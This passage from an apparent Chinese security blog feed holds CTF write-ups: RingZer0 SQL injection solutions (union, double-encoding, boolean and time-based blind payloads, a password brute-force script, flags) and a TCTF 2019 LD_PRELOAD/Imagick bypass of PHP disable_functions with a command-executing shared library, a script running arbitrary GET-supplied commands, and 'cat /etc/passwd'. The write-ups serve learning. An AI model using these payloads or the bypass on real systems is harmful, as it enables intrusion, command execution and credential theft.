class="hljs-comment">troll </span><span class="hljs-comment">aatroll</span></code></pre><p>查询表结构</p><pre><code class="hljs llvm">https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">39</span>/?id=<span class="hljs-number">1</span><span class="hljs-symbol">%20</span>Union<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%20</span>NULL,(SELECT<span class="hljs-symbol">%20</span>sql<span class="hljs-symbol">%20</span>FROM<span class="hljs-symbol">%20</span>sqlite_master<span class="hljs-symbol">%20</span>WHERE<span class="hljs-symbol">%20</span><span class="hljs-keyword">type</span>=<span class="hljs-symbol">%27</span>table<span class="hljs-symbol">%27</span><span class="hljs-symbol">%20</span>limit<span class="hljs-symbol">%201</span>,<span class="hljs-number">1</span>)#CREATE TABLE ajklshfajks (flag varchar(<span class="hljs-number">40</span>))</code></pre><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> random_stuff (<span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span>(<span class="hljs-number">10</span>), <span class="hljs-keyword">content</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>)) https://ringzer0ctf.com/challenges/<span class="hljs-number">39</span>/?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span>%<span class="hljs-number">20</span><span class="hljs-keyword">Union</span>%<span class="hljs-number">20</span><span class="hljs-keyword">select</span>%<span class="hljs-number">20</span><span class="hljs-literal">NULL</span>,(<span class="hljs-keyword">SELECT</span>%<span class="hljs-number">20</span>flag%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>ajklshfajks)<span class="hljs-comment">#</span></code></pre><h1 id="No-more-hacking-for-me-源代码泄露双重编码"><a href="#No-more-hacking-for-me-源代码泄露双重编码" class="headerlink" title="No more hacking for me! (源代码泄露双重编码)"></a>No more hacking for me! (源代码泄露双重编码)</h1><pre><code class="hljs lisp">urldecode(<span class="hljs-name">addslashes</span>(<span class="hljs-name">str_replace</span>(<span class="hljs-string">"'"</span>, <span class="hljs-string">""</span>, urldecode(<span class="hljs-name">htmlspecialchars</span>($_GET['id'], ENT_QUOTES)))))</code></pre><p>利用双重urldecode绕过</p><pre><code class="hljs llvm">https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">74</span>/?id=<span class="hljs-number">0</span><span class="hljs-symbol">%252527</span><span class="hljs-symbol">%20</span>union<span class="hljs-symbol">%20</span>all<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%201</span>,tbl_name,<span class="hljs-number">3</span><span class="hljs-symbol">%20</span>FROM<span class="hljs-symbol">%20</span>sqlite_master<span class="hljs-symbol">%20</span>WHERE<span class="hljs-symbol">%20</span><span class="hljs-keyword">type</span>=<span class="hljs-symbol">%252527</span>table<span class="hljs-symbol">%252527</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span>limit<span class="hljs-symbol">%200</span>,<span class="hljs-number">1</span><span class="hljs-symbol">%20</span>--random_data</code></pre><pre><code class="hljs llvm">https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">74</span>/?id=<span class="hljs-number">0</span><span class="hljs-symbol">%252527</span><span class="hljs-symbol">%20</span>union<span class="hljs-symbol">%20</span>all<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%201</span>,sql,<span class="hljs-number">3</span><span class="hljs-symbol">%20</span>FROM<span class="hljs-symbol">%20</span>sqlite_master<span class="hljs-symbol">%20</span>WHERE<span class="hljs-symbol">%20</span><span class="hljs-keyword">type</span>=<span class="hljs-symbol">%252527</span>table<span class="hljs-symbol">%252527</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%20</span>limit<span class="hljs-symbol">%200</span>,<span class="hljs-number">1</span><span class="hljs-symbol">%20</span>--CREATE TABLE random_data (id int, message varchar(<span class="hljs-number">50</span>), display int)</code></pre><h1 id="Don’t-Stumble-in-the-Process-（BOOL盲注）"><a href="#Don’t-Stumble-in-the-Process-（BOOL盲注）" class="headerlink" title="Don’t Stumble in the Process （BOOL盲注）"></a>Don’t Stumble in the Process （BOOL盲注）</h1><p>根据 1 or 1=2 1 and 1=2判断为Bool注入，且为整形<br><code>sqlmap -u &quot;http://challenges.ringzer0team.com:10291/?id=1*&quot;  --technique B --dbs</code><br><img src="./13.png" srcset="/img/loading.gif" alt=""><br>但是爆不出东西来</p><h1 id="Generate-random-quote-again-（双参数GET注入，转义字符）"><a href="#Generate-random-quote-again-（双参数GET注入，转义字符）" class="headerlink" title="Generate random quote again （双参数GET注入，转义字符）"></a>Generate random quote again （双参数GET注入，转义字符）</h1><p>有脑洞</p><pre><code class="hljs llvm">Payload:https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">38</span>?q=<span class="hljs-number">3</span>\&amp;s=ununionion<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%201</span>,<span class="hljs-number">2</span><span class="hljs-symbol">%23</span></code></pre><pre><code class="hljs llvm">https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">38</span>?q=<span class="hljs-number">3</span>\&amp;s=ununionion<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%201</span>,(<span class="hljs-keyword">select</span><span class="hljs-symbol">%20</span>group_concat(TABLE_NAME)<span class="hljs-symbol">%20</span>from<span class="hljs-symbol">%20</span>information_schema.tables<span class="hljs-symbol">%20</span>where<span class="hljs-symbol">%20</span>table_schema=database())<span class="hljs-symbol">%23</span>https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">38</span>?q=<span class="hljs-number">3</span>\&amp;s=ununionion<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%201</span>,(<span class="hljs-keyword">select</span><span class="hljs-symbol">%20</span>group_concat(column_name)<span class="hljs-symbol">%20</span>from<span class="hljs-symbol">%20</span>information_schema.columns<span class="hljs-symbol">%20</span>where<span class="hljs-symbol">%20</span>table_name=<span class="hljs-number">0x7164796b35</span>)<span class="hljs-symbol">%23</span>https://ringzer<span class="hljs-number">0</span>ctf.com/challenges/<span class="hljs-number">38</span>?q=<span class="hljs-number">3</span>\&amp;s=ununionion<span class="hljs-symbol">%20</span><span class="hljs-keyword">select</span><span class="hljs-symbol">%201</span>,(<span class="hljs-keyword">select</span><span class="hljs-symbol">%20</span>flag<span class="hljs-symbol">%20</span>from<span class="hljs-symbol">%20</span>qdyk<span class="hljs-number">5</span>)<span class="hljs-symbol">%23</span>FLAG-enjlleb<span class="hljs-number">337</span>u<span class="hljs-number">17</span>K<span class="hljs-number">7</span>yLqZ<span class="hljs-number">927</span>F<span class="hljs-number">3</span></code></pre><h2 id="老外wp"><a href="#老外wp" class="headerlink" title="老外wp"></a>老外wp</h2><p>猜测Sql语句为：<br><code>select id,quote from quotes where id=&quot;.htmlspecialchars($_GET[&#39;q&#39;]).&quot; and len(quote) &lt; &quot;.mysql_real_escape_string($_GET[&#39;s&#39;]).&quot; limit 1;</code></p><p>可以总结为双条件，需要屏蔽这两个参数，转义其中一个引号，构造联合注入</p><h1 id="Find-online-hot-single-Mom-（load-file注入）"><a href="#Find-online-hot-single-Mom-（load-file注入）" class="headerlink" title="Find online hot single Mom （load_file注入）"></a>Find online hot single Mom （load_file注入）</h1><p>Py跑太慢了,而且网页给挂了<br>参考链接<br><code>https://gist.github.com/h3xstream/3bc4f264cc911e37f0d6</code><br>思路为</p><pre><code class="hljs reasonml"><span class="hljs-number">1.</span>使用python得到password RSA加密后的密码<span class="hljs-number">2.</span>Python 跑”select load<span class="hljs-constructor">_file(‘<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">index</span>.<span class="hljs-params">php</span>’)</span>”获取源代码<span class="hljs-number">3.</span>根据index.php公钥文件路径取得公钥<span class="hljs-number">4.</span>解密密码</code></pre><p><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h1 id="Login-portal-3-（POST-BOOL注入）"><a href="#Login-portal-3-（POST-BOOL注入）" class="headerlink" title="Login portal 3 （POST BOOL注入）"></a>Login portal 3 （POST BOOL注入）</h1><p><code>admin&#39; and 1=2 and &#39;1&#39;=&#39;1</code></p><p><code>SQL1nj3ct10nFTW</code></p><p>登录拿到flag：<code>FLAG-vgnvokjmi3fgx0s23iv5x8n2w2</code><br><img src="./15.png" srcset="/img/loading.gif" alt=""></p><h1 id="Lite-login-portal-sqlite盲注"><a href="#Lite-login-portal-sqlite盲注" class="headerlink" title="Lite login portal (sqlite盲注)"></a>Lite login portal (sqlite盲注)</h1><p>盲注脚本如下，没有ascii()函数，且=必须加引号</p><p><img src="./16.png" srcset="/img/loading.gif" alt=""><br><img src="./17.png" srcset="/img/loading.gif" alt=""></p><p>密码：<code>4dm1nzP455</code><br><code>FLAG-rL4t5LRMwjacD82G9vpAd6Gm</code></p><h1 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h1><p>或者使用burpsuite增加效率<br><code>username=1&#39; or hex(substr(password, 1, 1)) = hex(&#39;§0§&#39;) -- &amp;password=zxasqw159</code><br><img src="./18.png" srcset="/img/loading.gif" alt=""></p><h1 id="Internet-As-A-Service-point-7-（-4-lt-0e1union拼接注入）"><a href="#Internet-As-A-Service-point-7-（-4-lt-0e1union拼接注入）" class="headerlink" title="Internet As A Service(point 7)（||4&lt;0e1union拼接注入）"></a>Internet As A Service(point 7)（||4&lt;0e1union拼接注入）</h1><pre><code class="hljs crystal">注入s=’||’ring’||’显示三行注入s=’||’ring’||’<span class="hljs-class"><span class="hljs-keyword">union</span>’||’不显示，<span class="hljs-title">union</span>被过滤</span>注入s=’||’ring’||’<span class="hljs-number">123</span><span class="hljs-keyword">union</span>’||’,显示ring关键字查询，说明直接拼接<span class="hljs-class"><span class="hljs-keyword">union</span>会被过滤</span></code></pre><p><code>select * from users where id=&#39;-1&#39;||4&lt;0e1union select 1,2,3;</code></p><p><img src="./19.png" srcset="/img/loading.gif" alt=""></p><p><code>?s=1&#39;||4&lt;3e0union%0Dall%0Dselect%0Dnull,null,flag%0Dfrom%0Drz_flag%23</code></p><p><img src="./20.png" srcset="/img/loading.gif" alt=""></p><h1 id="Login-portal-4-（时间盲注）"><a href="#Login-portal-4-（时间盲注）" class="headerlink" title="Login portal 4 （时间盲注）"></a>Login portal 4 （时间盲注）</h1><p>本题没有明显的回显提示，使用时间盲注</p><p><code>-1&#39; || if(1=2,sleep(5),1)#</code></p><pre><code class="hljs vala">import requestsimport sysfrom bs4 import BeautifulSoupimport <span class="hljs-keyword">string</span> passwd=<span class="hljs-string">''</span>url=<span class="hljs-string">"https://ringzer0ctf.com/challenges/6"</span><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<span class="hljs-keyword">for</span> str1 in (<span class="hljs-keyword">string</span>.ascii_letters+<span class="hljs-string">'0123456789'</span>):url=<span class="hljs-string">"https://ringzer0ctf.com/challenges/6"</span>sql=<span class="hljs-string">"-1' || if((substr((select password from users limit 0,1),"</span>+str(i)+<span class="hljs-string">",1)="</span>+<span class="hljs-string">"'"</span>+str1+<span class="hljs-string">"')"</span>+<span class="hljs-string">",sleep(3),1)#"</span>data=&#123;<span class="hljs-string">'username'</span>:sql,<span class="hljs-string">'password'</span>:<span class="hljs-string">'123'</span>&#125;cookie=&#123;<span class="hljs-string">'PHPSESSID'</span>:<span class="hljs-string">'mg0m9djc25o1m1a5e0a61nv543'</span>&#125;<span class="hljs-keyword">try</span>:print(sql)r=requests.post(url=url,data=data,cookies=cookie,timeout=<span class="hljs-number">2.5</span>)except:passwd=passwd+str1print(<span class="hljs-string">'password: '</span>+passwd)<span class="hljs-keyword">break</span><span class="hljs-meta"># In [10]: string.ascii_letters</span><span class="hljs-meta"># Out[10]: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="hljs-meta"># In [11]: string.ascii_lowercase</span><span class="hljs-meta"># Out[11]: 'abcdefghijklmnopqrstuvwxyz'</span><span class="hljs-meta"># In [12]: string.ascii_uppercase</span><span class="hljs-meta"># Out[12]: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="hljs-meta"># In [13]: string.digits</span><span class="hljs-meta"># Out[13]: '0123456789'</span><span class="hljs-meta"># In [14]: string.punctuation</span><span class="hljs-meta"># Out[14]: '!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span><span class="hljs-meta"># In [15]: string.whitespace</span><span class="hljs-meta"># Out[15]: '\t\n\x0b\x0c\r '</span></code></pre><p>得到密码：<br><code>UrASQLi1337!</code></p><p>登录后拿到flag<br><code>FLAG-70ygerntbicjdzrxmm0rmk0xx2</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCTF | LD_PRELOAD系统劫持绕过disable_functions</title>
    <link href="/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/"/>
    <url>/2019/03/31/TCTF-LD-PRELOAD%E7%B3%BB%E7%BB%9F%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-function/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>参加TCTF也是伤感，web题目只有两题….但是质量实在是高，虽然没搞出来。但是最后看wp学了不少东西。</p></blockquote><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><a href="https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy" target="_blank" rel="noopener">小西师傅的docker环境</a></p><h1 id="LD-PRELOAD解释"><a href="#LD-PRELOAD解释" class="headerlink" title="LD_PRELOAD解释"></a>LD_PRELOAD解释</h1><blockquote><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><p>摘自<a href="https://blog.csdn.net/chen_jianjian/article/details/80627693" target="_blank" rel="noopener">https://blog.csdn.net/chen_jianjian/article/details/80627693</a></p><h1 id="LD-PRELOAD劫持系统函数操作"><a href="#LD-PRELOAD劫持系统函数操作" class="headerlink" title="LD_PRELOAD劫持系统函数操作"></a>LD_PRELOAD劫持系统函数操作</h1><h2 id="创建c文件random-num-c生成随机数"><a href="#创建c文件random-num-c生成随机数" class="headerlink" title="创建c文件random_num.c生成随机数"></a>创建c文件random_num.c生成随机数</h2><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span> <span class="hljs-built_in">int</span> main()&#123;  srand(time(<span class="hljs-literal">NULL</span>))<span class="hljs-comment">;</span>  <span class="hljs-built_in">int</span> i = <span class="hljs-number">10</span><span class="hljs-comment">;</span>  <span class="hljs-keyword">while</span>(i--) printf(<span class="hljs-string">"%d\n"</span>,rand()%<span class="hljs-number">100</span>)<span class="hljs-comment">;</span>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span>&#125;</code></pre><h2 id="编译random-num-c生成可执行文件random-num"><a href="#编译random-num-c生成可执行文件random-num" class="headerlink" title="编译random_num.c生成可执行文件random_num"></a>编译random_num.c生成可执行文件random_num</h2><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>gcc random_num.c -o random_num</code></pre><h2 id="创建unrandom-c文件"><a href="#创建unrandom-c文件" class="headerlink" title="创建unrandom.c文件"></a>创建unrandom.c文件</h2><p>与random.c文件不同这里rand()方法只返回42</p><pre><code class="hljs angelscript"><span class="hljs-built_in">int</span> rand()&#123;    <span class="hljs-keyword">return</span> <span class="hljs-number">42</span>; <span class="hljs-comment">//the most random number in the universe</span>&#125;</code></pre><p>并编译unrandom.c成一个共享库</p><pre><code class="hljs angelscript">$ gcc -<span class="hljs-keyword">shared</span> -fPIC unrandom.c -o unrandom.so</code></pre><p>临时文件目录文件存在情况如下<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h2 id="执行random-num"><a href="#执行random-num" class="headerlink" title="执行random_num"></a>执行random_num</h2><p><strong>libc.so为c语言执行所必须调用的共享库</strong></p><p>分别执行random_num<br>1.LD_PRELOAD动态链接unrandom.so共享库<br>2.系统libc.so共享库下执行文件</p><p>如下图产生不同结果<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="LD-PRELOAD劫持系统函数原理"><a href="#LD-PRELOAD劫持系统函数原理" class="headerlink" title="LD_PRELOAD劫持系统函数原理"></a>LD_PRELOAD劫持系统函数原理</h1><p>上面操作中random_num中的输出按照正常思维是会输出随机数，在LD_PRELOAD动态链接unrandom.so下却为42。为什么系统的libc.so库不起作用？</p><pre><code class="hljs avrasm">执行命令$ <span class="hljs-keyword">ldd</span> ./random_num</code></pre><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>运行<code>random_num</code>所需要的库,<code>libc.so</code>提供核心c功能文件，包括<code>rand()</code></p><pre><code class="hljs crystal">执行命令$ nm -D /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">x86_64</span>-<span class="hljs-title">linux</span>-<span class="hljs-title">gnu</span>/<span class="hljs-title">libc</span>.<span class="hljs-title">so</span>.6</span></code></pre><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs routeros">执行命令$ <span class="hljs-attribute">LD_PRELOAD</span>=<span class="hljs-variable">$PWD</span>/unrandom.so ldd random_num</code></pre><p>可以发现使用<code>LD_PRELOAD</code>动态链接的共享库优先级高于<code>libc.so.6</code>中的<code>rand()</code>函数，先执行<code>unrandom.so</code>定义的<code>rand()</code>函数。</p><p><strong>所以random_num文件不会输出随机数!!!!</strong><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="LD-PRELOAD劫持共享对象"><a href="#LD-PRELOAD劫持共享对象" class="headerlink" title="LD_PRELOAD劫持共享对象"></a>LD_PRELOAD劫持共享对象</h1><p>若PHP.ini启动diable_disfunctions禁用了许多系统操作shell方法,使用LD_PRELOAD劫持系统函数是达不到目的，因为既然你能劫持函数说明shell函数是可执行的。</p><p>那么就要采用LD_PERLOAD劫持共享对象，条件是PHP启动了除PHP解释器外的其他系统进程。</p><h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><p>如PHP调用<code>goFward()</code>方法就能启动新的进程</p><blockquote><p>启动PHP解释器-&gt;调用goFward()-&gt;调用c模块move.c-&gt;调用外部程序go.bin</p></blockquote><h2 id="mail-函数产生进程"><a href="#mail-函数产生进程" class="headerlink" title="mail()函数产生进程"></a>mail()函数产生进程</h2><p>php中<code>mail()</code>函数就能产生新的系统进程</p><h3 id="创建mail方法"><a href="#创建mail方法" class="headerlink" title="创建mail方法"></a>创建mail方法</h3><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h3 id="追踪函数调用情况，发现调用了外部程序"><a href="#追踪函数调用情况，发现调用了外部程序" class="headerlink" title="追踪函数调用情况，发现调用了外部程序"></a>追踪函数调用情况，发现调用了外部程序</h3><p>可以看到除了启动PHP解释器外，还启用了sendmail</p><pre><code class="hljs angelscript">strace-f php mail.php <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep -A2 -B2 execve</code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="利用imagick实现共享对象劫持"><a href="#利用imagick实现共享对象劫持" class="headerlink" title="利用imagick实现共享对象劫持"></a>利用imagick实现共享对象劫持</h1><p>TCTF中<code>mail()</code>方法不可用，题目提示<code>imagick</code>扩展方法。</p><p><code>imagick</code>对<code>eps</code>文件解析时候会调用系统进程</p><p>在当前目录下存放有效的123.eps文件，编辑文image.php件</p><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$a = <span class="hljs-keyword">new</span> Imagick(<span class="hljs-string">'123.eps'</span>);</span></code></pre><p>发现调用了<code>gs</code>进程，这样我们就能构造c文件，使得<code>LD_PRELOAD</code>劫持共享对象，并输入想要执行的<code>shell</code>命令<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h2 id="创建Bypass-c"><a href="#创建Bypass-c" class="headerlink" title="创建Bypass.c"></a>创建Bypass.c</h2><pre><code class="hljs autoit"><span class="hljs-meta">#define _GNU_SOURCE</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><span class="hljs-built_in">int</span> __attribute__((__constructor__)) init(void)&#123;unsetenv(<span class="hljs-string">"LD_PRELOAD"</span>)<span class="hljs-comment">;</span>system(<span class="hljs-string">"cat /etc/passwd&gt;./456.txt 2&gt;&amp;1"</span>)<span class="hljs-comment">;</span><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span>&#125;</code></pre><p><code>unsetenv</code>删除<code>LD_PRELOADA</code>环境变量，否则进程一直打开，会无限循环，这是不愿意看到的行为</p><pre><code class="hljs mipsasm">编译$ gcc -<span class="hljs-keyword">shared </span>-fPIC <span class="hljs-keyword">bypass.c </span>-o <span class="hljs-keyword">bypass.so</span></code></pre><h2 id="创建image-php文件"><a href="#创建image-php文件" class="headerlink" title="创建image.php文件"></a>创建image.php文件</h2><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">putenv(<span class="hljs-string">"LD_PRELOAD=/home/od0d/tmpdir/bypass.so"</span>);</span><span class="php">$a = <span class="hljs-keyword">new</span> Imagick(<span class="hljs-string">'123.eps'</span>);</span></code></pre><p>终端执行命令<code>php -f ./image.php</code><br>在当前目录输出了文件<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><h1 id="TCTF"><a href="#TCTF" class="headerlink" title="TCTF"></a>TCTF</h1><p>TCTF禁用函数如下<br><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p>根据以上分析构造的php文件需要满足如下要求</p><pre><code class="hljs angelscript">C中命令cat /etc/passwd &gt; ./<span class="hljs-number">456.</span>txt <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span></code></pre><blockquote><p>传入参数需求</p></blockquote><ol><li>$_GET[‘cmd’]需要执行的系统命令</li><li>$outpath系统命令执行之后内容重定向的文件位置</li><li>$sopath so共享对象文件存放的位置</li><li>使用putenv设置EVIL_CMDLINE，c文件提取需要执行的命令<br>注意点：</li><li>命令执行之后必须删除LD_PRELOAD环境变量否则由于进程的开启会无限循环执行该系统变量。</li><li>C文件函数需要添加<strong>attribute</strong> ((<strong>constructor</strong>))</li></ol><p>使用Imagick触发/usr/bin/gs打开无效.eps文件<br>编写共享库和php文件并执行，成功获取系统信息</p><p><img src="./10.png" srcset="/img/loading.gif" alt=""><br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p><code>http://172.17.0.1:8888/imagebypass.php?cmd=/readflag&amp;outpath=/var/www/html/324.txt&amp;sopath=/var/www/html/bypass.so</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="文件源码"><a href="#文件源码" class="headerlink" title="文件源码"></a>文件源码</h1><h2 id="123-eps-怕忘了这个文件，随手加"><a href="#123-eps-怕忘了这个文件，随手加" class="headerlink" title="123.eps(怕忘了这个文件，随手加)"></a>123.eps(怕忘了这个文件，随手加)</h2><pre><code class="hljs gams"><span class="hljs-symbol">$</span> vim <span class="hljs-number">123.</span><span class="hljs-literal">eps</span></code></pre><p><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h2 id="bypass-c"><a href="#bypass-c" class="headerlink" title="bypass.c"></a>bypass.c</h2><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>** environ;__attribute__ ((__constructor__)) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">preload</span> <span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;   unsetenv(<span class="hljs-string">"LD_PRELOAD"</span>);    <span class="hljs-comment">// get command line options and arg</span>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmdline = getenv(<span class="hljs-string">"EVIL_CMDLINE"</span>);    <span class="hljs-comment">// executive command</span>    system(cmdline);&#125;</code></pre><h2 id="bypassimage-php"><a href="#bypassimage-php" class="headerlink" title="bypassimage.php"></a>bypassimage.php</h2><pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><span class="php">$cmd = $_GET[<span class="hljs-string">"cmd"</span>];</span><span class="php">$out_path = $_GET[<span class="hljs-string">"outpath"</span>];</span><span class="php">$evil_cmdline = $cmd . <span class="hljs-string">" &gt; "</span> . $out_path . <span class="hljs-string">" 2&gt;&amp;1"</span>;</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="hljs-string">"&lt;/p&gt;"</span>;</span><span class="php">putenv(<span class="hljs-string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><span class="php">$so_path = $_GET[<span class="hljs-string">"sopath"</span>];</span><span class="php">putenv(<span class="hljs-string">"LD_PRELOAD="</span> . $so_path);</span><span class="php">putenv(<span class="hljs-string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><span class="php">$a = <span class="hljs-keyword">new</span> Imagick(<span class="hljs-string">'123.eps'</span>);</span><span class="php"><span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="hljs-string">"&lt;/p&gt;"</span>;</span></code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/" target="_blank" rel="noopener">LD_PRELOAD 劫持系统函数的能力</a><br><a href="https://github.com/mdsnins/ctf-writeups/blob/master/2019/0ctf%202019/Wallbreaker%20Easy/WallbreakerEasy.md" target="_blank" rel="noopener">TCTF2019/Wallbreaker_Easy WP</a><br><a href="https://paper.tuisec.win/detail/d4ba64dd4d1dc38" target="_blank" rel="noopener">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="http://momomoxiaoxi.com/2019/03/26/tctf2019/" target="_blank" rel="noopener">TCTF2019 Web WP</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>session处理器使用不当导致对象注入</title>
    <link href="/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/"/>
    <url>/2019/03/24/session%E5%8F%8D-%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93/</url>
    
